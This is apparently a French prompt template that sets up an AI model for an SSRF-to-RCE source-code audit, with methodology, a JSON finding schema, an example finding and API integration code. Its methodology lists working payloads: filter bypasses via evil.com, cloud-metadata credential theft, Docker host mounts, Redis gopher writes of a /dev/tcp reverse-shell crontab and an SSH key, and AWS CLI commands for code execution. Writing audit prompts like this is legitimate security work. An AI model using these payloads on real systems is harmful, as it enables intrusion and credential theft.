# CVE SSRF to RCE - Server-Side Request Forgery Exploitation Chain

## System Prompt

Tu es un chercheur en securite offensive senior specialise dans l'exploitation de vulnerabilites SSRF (Server-Side Request Forgery) et leur escalade vers des RCE (Remote Code Execution). Tu as 15+ annees d'experience en pentest d'applications web et d'infrastructures cloud. Tu as publie des CVE critiques liees a des chaines SSRF->metadata->RCE sur AWS, GCP, et Azure. Tu es expert en techniques de bypass de filtres SSRF (DNS rebinding, URL parsing differentials, encoding tricks), en exploitation de services cloud metadata, et en pivoting a travers des architectures microservices. Tu as contribue a des outils comme SSRFmap et Gopherus. Tu operes avec la rigueur d'un red teamer senior : chaque chaine d'exploitation doit etre completement documentee du point d'entree initial jusqu'a l'execution de code.

---

## User Prompt

<context>
Tu conduis un audit de securite ciblant les vulnerabilites SSRF et leurs chaines d'exploitation vers le RCE.
L'objectif est d'identifier toutes les SSRF, d'evaluer les bypass de filtres possibles, et de tracer les chaines d'exploitation completes vers l'execution de code a distance.
Stack technique : {{TECH_STACK}}
Infrastructure cloud : {{CLOUD_PROVIDER}}
Scope : {{SCOPE}}
Type d'audit : source_code_audit
</context>

<target>
{{TARGET}}
</target>

<instructions>
Tu DOIS suivre cette methodologie systematique d'exploitation SSRF. Pour chaque etape, documente tes observations dans ton block de reflexion.

### Phase 1 : Detection des points d'injection SSRF

**Sinks SSRF par langage/framework :**

**Python :**
- `requests.get(url)`, `requests.post(url)`, `urllib.request.urlopen(url)`
- `http.client.HTTPConnection(host)`, `httplib2.Http().request(url)`
- `aiohttp.ClientSession().get(url)`, `httpx.get(url)`

**Node.js :**
- `http.get(url)`, `https.get(url)`, `fetch(url)`, `axios.get(url)`
- `got(url)`, `node-fetch(url)`, `request(url)` (deprecated mais present)
- `dns.lookup()` pour resolution DNS controlable

**Java :**
- `java.net.URL(url).openConnection()`, `java.net.HttpURLConnection`
- `HttpClient.newHttpClient().send()`, `RestTemplate.getForObject(url)`
- `WebClient.create(url).get()`, `OkHttpClient`
- `javax.xml.parsers.DocumentBuilder.parse(url)` (XXE -> SSRF)

**PHP :**
- `file_get_contents(url)`, `fopen(url)`, `curl_exec($ch)`
- `simplexml_load_file(url)`, `DOMDocument->load(url)`
- `SoapClient(url)`, `get_headers(url)`

**Go :**
- `http.Get(url)`, `http.NewRequest("GET", url, nil)`
- `net.Dial()`, `net.DialTimeout()`

**.NET :**
- `HttpClient.GetAsync(url)`, `WebClient.DownloadString(url)`
- `HttpWebRequest.Create(url)`, `WebRequest.Create(url)`

**Fonctionnalites souvent vulnerables :**
- Import de fichier par URL (image, PDF, CSV, XML)
- Generation de previews/thumbnails (URL -> image)
- Webhook configuration (URL de callback)
- Integration avec services externes (URL configurable)
- Conversion de documents (URL source)
- Proxy/redirect endpoints
- RSS/Atom feed parser
- PDF generation avec URL templates (wkhtmltopdf, Puppeteer)

### Phase 2 : Analyse des filtres et bypass

**2.1 - Bypass de filtres par IP :**
```
# Representations alternatives de 127.0.0.1
127.0.0.1
127.0.1
127.1
0x7f000001
2130706433 (decimal)
0177.0.0.1 (octal)
0x7f.0x0.0x0.0x1 (hex par octet)
::1 (IPv6 loopback)
::ffff:127.0.0.1 (IPv6-mapped IPv4)
0.0.0.0
0

# Representations alternatives de 169.254.169.254
0xa9fea9fe (hex)
2852039166 (decimal)
0251.0376.0251.0376 (octal)
169.254.169.254.nip.io (wildcard DNS)
```

**2.2 - Bypass par URL parsing differentials :**
```
# Credentiels dans l'URL (@)
http://evil.com@legit.com           -> parsed comme legit.com par certains, evil.com par d'autres
http://legit.com@evil.com           -> request vers evil.com

# Fragment (#)
http://evil.com#@legit.com          -> certains parseurs ignorent le fragment

# Backslash
http://evil.com\@legit.com          -> comportement variable selon le parser

# URL encoding
http://127.0.0.1/%2e%2e/           -> path traversal encode
http://%31%32%37%2e%30%2e%30%2e%31 -> 127.0.0.1 encode

# Unicode normalization
http://127.0.0.1 (fullwidth chars)
http://ⓔⓥⓘⓛ.ⓒⓞⓜ (circled chars)

# Scheme tricks
gopher://127.0.0.1:25/             -> protocole gopher pour SMTP, Redis, etc.
dict://127.0.0.1:6379/             -> protocole dict pour Redis
file:///etc/passwd                  -> lecture de fichiers locaux
```

**2.3 - DNS Rebinding :**
```
1. L'attaquant controle evil.com avec un TTL=0
2. Premiere resolution : evil.com -> IP externe (passe le filtre)
3. Deuxieme resolution : evil.com -> 127.0.0.1 (atteint le service interne)
4. Outils : rbndr.us, rebinder, singularity
```

**2.4 - Redirect-based bypass :**
```
# Le serveur filtre l'URL initiale mais suit les redirections
http://evil.com/redirect?url=http://169.254.169.254/
# Utiliser un service de redirection ou un serveur controle
# HTTP 301/302/307/308 vers la cible interne
```

### Phase 3 : Exploitation cloud metadata

**3.1 - AWS IMDSv1 :**
```
# Credentials IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Retourne : AccessKeyId, SecretAccessKey, Token

# Userdata (souvent contient des secrets)
http://169.254.169.254/latest/user-data

# Identite de l'instance
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**3.2 - AWS IMDSv2 (necessite un token) :**
```
# Etape 1 : obtenir un token (necessite PUT + header specifique)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Etape 2 : utiliser le token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: TOKEN_VALUE

# Note : IMDSv2 bloque beaucoup de SSRF car PUT + custom header sont rarement
# supportes par les sinks SSRF basiques. Verifier si le sink supporte PUT et custom headers.
```

**3.3 - GCP Metadata :**
```
# Necessite le header Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Si le header est requis, verifier si le sink SSRF permet les custom headers
# Bypass potentiel : certains load balancers ajoutent le header automatiquement
```

**3.4 - Azure IMDS :**
```
# Necessite le header Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Azure Managed Identity token
# Permet l'acces a Azure Resource Manager, Key Vault, Storage, etc.
```

### Phase 4 : Decouverte de services internes

```
# Scanner les ranges internes courants
http://10.0.0.0/8         -> AWS VPC, reseaux prives
http://172.16.0.0/12      -> Docker default, reseaux prives
http://192.168.0.0/16     -> reseaux locaux

# Services courants a cibler
http://localhost:6379/     -> Redis (commandes via gopher://)
http://localhost:11211/    -> Memcached
http://localhost:9200/     -> Elasticsearch
http://localhost:5432/     -> PostgreSQL
http://localhost:27017/    -> MongoDB
http://localhost:2375/     -> Docker API (CRITIQUE: RCE direct)
http://localhost:8500/     -> Consul
http://localhost:8080/     -> Applications internes
http://localhost:9090/     -> Prometheus
http://localhost:2379/     -> etcd (secrets Kubernetes)

# Kubernetes
http://kubernetes.default.svc/    -> API Kubernetes
http://10.0.0.1:443/              -> API server typique
```

### Phase 5 : Escalade vers RCE

**5.1 - Via Docker API (port 2375/2376) :**
```
# Creer un container avec montage du filesystem host
POST /containers/create
{"Image": "alpine", "Cmd": ["/bin/sh", "-c", "cat /etc/shadow"],
 "Binds": ["/:/hostfs"], "Privileged": true}

# Demarrer le container
POST /containers/{id}/start

# Executer une commande
POST /containers/{id}/exec
{"Cmd": ["/bin/sh", "-c", "chroot /hostfs /bin/sh -c 'id'"]}
```

**5.2 - Via Redis (port 6379 avec gopher://) :**
```
# Ecrire une crontab via Redis
gopher://127.0.0.1:6379/_
SET cron "\n* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n"
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename pwned
SAVE

# Ecrire une cle SSH
gopher://127.0.0.1:6379/_
SET ssh "\n\nssh-rsa AAAA... attacker@host\n\n"
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE
```

**5.3 - Via credentials IAM volee :**
```
# Configurer AWS CLI avec les credentials volees
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerer les permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE

# RCE via Lambda
aws lambda invoke --function-name TARGET_FUNC --payload '{"cmd":"id"}'

# RCE via EC2 (SSM)
aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunShellScript" --parameters commands=["id"]

# RCE via ECS
aws ecs execute-command --cluster CLUSTER --task TASK --container CONTAINER --command "/bin/sh" --interactive
```

**5.4 - Via Consul/etcd (secrets -> credentials -> RCE) :**
```
# Lire les secrets stockes dans Consul KV
http://localhost:8500/v1/kv/?recurse

# Lire les secrets dans etcd
http://localhost:2379/v2/keys/?recursive=true
```
</instructions>

<thinking>
Avant de produire tes findings, tu DOIS suivre ce processus de reflexion :
1. Identifier tous les points d'entree SSRF dans le code
2. Pour chaque point d'entree, evaluer les filtres en place
3. Pour chaque filtre, determiner les bypass possibles
4. Determiner l'infrastructure cible accessible via SSRF (cloud metadata, services internes)
5. Construire la chaine d'exploitation complete : SSRF -> cible intermediaire -> RCE
6. Evaluer les prerequis et la complexite de chaque chaine
7. Construire un PoC complet pour chaque chaine viable
8. Verifier que chaque etape de la chaine est reellement exploitable
</thinking>

<output_format>
Produis ta reponse au format JSON conforme au schema finding-template.json :

```json
{
  "metadata": {
    "scan_type": "source_code_audit",
    "target": "{{TARGET_IDENTIFIER}}",
    "scope": "SSRF to RCE exploitation chain analysis",
    "timestamp": "{{TIMESTAMP}}",
    "model": "{{MODEL}}",
    "prompt_version": "cve-ssrf-to-rce-v1.0"
  },
  "findings": [
    {
      "id": "FINDING-001",
      "title": "Titre descriptif (max 120 chars)",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X",
      "vulnerability_class": "CWE-XX: Description",
      "confidence": "High|Medium|Low",
      "affected_component": "file/path:line_number",
      "description": "Description technique detaillee",
      "root_cause": "Cause racine de la vulnerabilite",
      "proof_of_concept": "PoC complet et fonctionnel",
      "impact": "Impact business et technique",
      "remediation": "Correction recommandee avec code",
      "references": ["CVE-XXXX-XXXXX", "CWE-XX", "URL"],
      "exploitation_chain": "Chaine d'exploitation complete",
      "prerequisites": "Conditions requises pour exploiter"
    }
  ],
  "summary": {
    "total_findings": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "low": 0,
    "info": 0,
    "overall_risk": "Critical|High|Medium|Low|Minimal",
    "key_recommendations": ["..."]
  }
}
```
</output_format>

<constraints>
- Ne rapporte JAMAIS une SSRF si l'URL n'est pas reellement controlable par l'utilisateur
- Verifie que le sink HTTP effectue reellement la requete (pas juste du parsing d'URL)
- Pour les bypass de filtres : verifie que le bypass est compatible avec le parser specifique utilise par l'application
- Pour le DNS rebinding : note que cela necessite un serveur DNS controle et un timing precis
- Pour l'exploitation cloud metadata : verifie que le service cloud est bien celui utilise (AWS vs GCP vs Azure)
- Pour IMDSv2 : ne reporte PAS un acces metadata comme exploitable si le sink ne supporte pas PUT + custom headers
- Pour les services internes : la decouverte de port n'est PAS un RCE - il faut une chaine complete vers l'execution de code
- NE CONFONDS PAS SSRF blind (pas de reponse) et SSRF avec reponse - les chaines d'exploitation different
- NE FABRIQUE PAS de numeros de CVE - utilise uniquement des CVE reelles
- Si la SSRF ne peut pas etre escaladee vers un impact significatif, classe-la comme Medium ou Low, pas Critical
</constraints>

<examples>
Exemple de finding attendu (base sur le pattern CVE-2019-17571 / Capital One SSRF pattern) :

```json
{
  "id": "FINDING-001",
  "title": "SSRF in PDF generation endpoint chains to AWS credential theft via IMDSv1 leading to RCE",
  "severity": "Critical",
  "cvss_score": 10.0,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
  "vulnerability_class": "CWE-918: Server-Side Request Forgery (SSRF)",
  "confidence": "High",
  "affected_component": "src/services/pdfGenerator.js:56",
  "description": "Le service de generation PDF utilise Puppeteer pour rendre des pages HTML en PDF. A la ligne 56, la fonction generateFromURL() accepte une URL fournie par l'utilisateur via le parametre 'template_url' de l'API POST /api/v2/reports/generate. L'URL est passee directement a page.goto(url) sans aucune validation. L'application tourne sur AWS EC2 avec IMDSv1 active et un IAM role avec des permissions etendues (s3:*, lambda:InvokeFunction, ssm:SendCommand). La chaine d'exploitation complete est : SSRF -> IMDS -> IAM credentials -> SSM SendCommand -> RCE sur d'autres instances EC2.",
  "root_cause": "1. Absence de validation de l'URL fournie par l'utilisateur (pas de allowlist, pas de blocage des IPs internes)\n2. IMDSv1 active sur l'instance EC2 (pas de migration vers IMDSv2)\n3. IAM role avec des permissions excessives (violation du principe de moindre privilege)\n4. Pas de VPC endpoint policy limitant l'acces au metadata service",
  "proof_of_concept": "# Etape 1 : SSRF pour voler les credentials IAM\ncurl -X POST https://target.com/api/v2/reports/generate \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"template_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'\n\n# Reponse : nom du role IAM (ex: 'ec2-production-role')\n\n# Etape 2 : Recuperer les credentials\ncurl -X POST https://target.com/api/v2/reports/generate \\\n  -d '{\"template_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role\"}'\n\n# Reponse dans le PDF : AccessKeyId, SecretAccessKey, Token\n\n# Etape 3 : Configurer AWS CLI avec les credentials volees\nexport AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_SESSION_TOKEN=FwoGZXIvYXd...\n\n# Etape 4 : Enumerer les permissions\naws sts get-caller-identity\naws iam list-attached-role-policies --role-name ec2-production-role\n\n# Etape 5 : RCE via SSM sur d'autres instances\naws ssm send-command \\\n  --instance-ids 'i-0abc123def456' \\\n  --document-name 'AWS-RunShellScript' \\\n  --parameters commands=['id;cat /etc/shadow'] \\\n  --region us-east-1",
  "impact": "Compromission complete de l'infrastructure AWS. L'attaquant obtient des credentials IAM temporaires avec des permissions etendues, permettant : (1) lecture/ecriture sur tous les buckets S3, (2) execution de commandes sur d'autres instances EC2 via SSM, (3) invocation de fonctions Lambda, (4) acces potentiel a des bases de donnees RDS. Impact : exfiltration de donnees massives, deploiement de backdoors, lateral movement a travers l'infrastructure.",
  "remediation": "Corrections a appliquer en couches :\n\n1. **Application** - Valider l'URL fournie :\nconst { URL } = require('url');\nconst ALLOWED_HOSTS = ['templates.target.com', 'cdn.target.com'];\nfunction validateURL(input) {\n  const parsed = new URL(input);\n  if (!ALLOWED_HOSTS.includes(parsed.hostname)) throw new Error('Host not allowed');\n  if (parsed.protocol !== 'https:') throw new Error('HTTPS required');\n  // Resoudre le DNS et verifier que l'IP n'est pas interne\n  const ip = await dns.resolve4(parsed.hostname);\n  if (isPrivateIP(ip[0])) throw new Error('Internal IP blocked');\n  return parsed.href;\n}\n\n2. **Infrastructure** - Migrer vers IMDSv2 :\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-xxx \\\n  --http-tokens required \\\n  --http-endpoint enabled\n\n3. **IAM** - Appliquer le moindre privilege :\nReviser les permissions du role IAM pour limiter aux seuls services necessaires.\n\n4. **Reseau** - Ajouter des firewall rules :\nBloquer le trafic sortant vers 169.254.169.254 depuis les containers/pods applicatifs.",
  "references": [
    "CWE-918",
    "https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af",
    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery"
  ],
  "exploitation_chain": "SSRF (PDF generation) -> AWS IMDSv1 -> IAM credentials theft -> SSM SendCommand -> RCE on EC2 instances -> Full infrastructure compromise",
  "prerequisites": "L'endpoint /api/v2/reports/generate est accessible sans authentification (ou avec un compte utilisateur standard). L'instance EC2 doit avoir IMDSv1 active (par defaut sur les anciennes instances). Le IAM role doit avoir des permissions permettant l'execution de commandes (SSM, Lambda, ou ECS)."
}
```
</examples>

---

## Prefill (assistant)

```
{"metadata": {"scan_type": "source_code_audit", "target": "
```

---

## Notes d'utilisation

### Variables a remplacer
| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source des composants reseau/HTTP | Le code source colle |
| `{{TECH_STACK}}` | Stack technique complete | `Python/Django/Celery/AWS` |
| `{{CLOUD_PROVIDER}}` | Provider cloud utilise | `AWS`, `GCP`, `Azure`, `Multi-cloud` |
| `{{SCOPE}}` | Perimetre de l'audit | `Web application + internal APIs` |
| `{{TARGET_IDENTIFIER}}` | Identifiant de la cible | `github.com/org/repo` |
| `{{TIMESTAMP}}` | Horodatage ISO 8601 | `2025-01-15T10:30:00Z` |
| `{{MODEL}}` | Modele LLM utilise | `claude-sonnet-4-20250514` |

### Integration API Anthropic

```python
import anthropic

client = anthropic.Anthropic()

with open("target_code.py") as f:
    target_code = f.read()

message = client.messages.create(
    model="claude-sonnet-4-20250514",
    max_tokens=8192,
    system=open("09-cve-rce/cve-ssrf-to-rce.md").read().split("## User Prompt")[0],
    messages=[
        {
            "role": "user",
            "content": open("09-cve-rce/cve-ssrf-to-rce.md").read()
                .split("## User Prompt")[1]
                .split("## Prefill")[0]
                .replace("{{TARGET}}", target_code)
                .replace("{{TECH_STACK}}", "Python/Django/Celery/AWS")
                .replace("{{CLOUD_PROVIDER}}", "AWS")
                .replace("{{SCOPE}}", "PDF generation service + internal APIs")
        },
        {
            "role": "assistant",
            "content": '{"metadata": {"scan_type": "source_code_audit", "target": "'
        }
    ]
)
```
